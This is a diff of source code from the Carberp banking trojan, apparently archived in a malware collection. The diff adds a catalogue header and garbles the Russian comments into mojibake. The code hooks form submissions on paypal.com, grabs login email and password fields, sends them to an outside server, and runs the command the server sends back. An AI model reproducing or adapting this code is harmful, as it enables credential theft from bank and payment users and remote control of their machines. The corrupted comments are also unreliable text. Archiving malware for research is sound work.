@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -15,28 +26,28 @@ const PCHAR DuplicateDataURL = "http://w1zzz.com/set/fgr.html";
 
 void PayPalDataEvent(PSendHTMLData Data, bool &IgnoreHandler,  bool &Cancel)
 {
-	// Функция проверяет наличие имени login в отправляемых данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ login пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::Pos(Data->Data, "login_email") < 0 || STR::Pos(Data->Data, "login_password") < 0)
 	{
 		IgnoreHandler = true;
 		return;
     }
 
-	// Отправляем данные на сервер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Response = NULL;
 	DataGrabber::SendHTMLDataToServer(DuplicateDataURL, Data, &Response);
 	ExecuteCommand(NULL, Response, true);
 }
 
 
-//------------  Регистрируем обработчики отправки данных -------------------//
+//------------  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ -------------------//
 
 //bool Initialized = false;
 
 void InitHTMLSendHandlers()
 {
 
-    // Регистрируем обработчики отправки
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	RegisterSendDataHandler("*paypal.com*", PayPalDataEvent, hdmUnknown, DuplicateDataURL);
 }
 
